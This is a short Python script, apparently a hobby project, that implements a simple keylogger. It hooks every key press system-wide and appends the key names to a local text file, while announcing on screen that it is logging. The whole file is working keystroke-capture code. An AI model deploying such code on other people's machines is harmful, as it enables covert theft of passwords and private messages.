import keyboard
import argparse

import argparse

parser = argparse.ArgumentParser(
    description=' A simple keylogger made in python.',
    epilog='Written by Lucas Caetano <https://github.com/LucasRibeiroCaetano>'
)
parser.add_argument('-f', '--filename', help='Specify the filename')

args = parser.parse_args()

if args.filename:
    log_file = args.filename
else:
    # Default filename
    log_file = 'keystrokes.txt' 

def on_key_press(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.name))


def main():
    print("Logging keystrokes to {}".format(log_file))
    print("Press Ctrl+C to stop logging.")
    keyboard.on_press(on_key_press)
    keyboard.wait()


if __name__ == '__main__':
    main()
